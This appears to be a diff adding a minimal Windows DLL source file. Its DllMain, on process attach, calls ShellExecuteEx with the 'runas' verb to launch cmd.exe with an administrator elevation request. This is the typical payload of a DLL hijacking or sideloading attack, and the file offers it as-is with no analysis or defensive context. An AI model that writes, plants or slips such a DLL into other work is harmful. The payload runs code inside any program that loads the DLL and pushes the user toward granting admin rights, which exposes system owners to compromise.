@@ -1,0 +1,17 @@
+#include <windows.h>
+
+void SpawnAdminCmd() {
+    SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
+    sei.lpVerb = "runas";  // Requests admin privileges
+    sei.lpFile = "cmd.exe"; 
+    sei.nShow = SW_SHOWNORMAL;
+
+    ShellExecuteEx(&sei);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        SpawnAdminCmd();
+    }
+    return TRUE;
+}
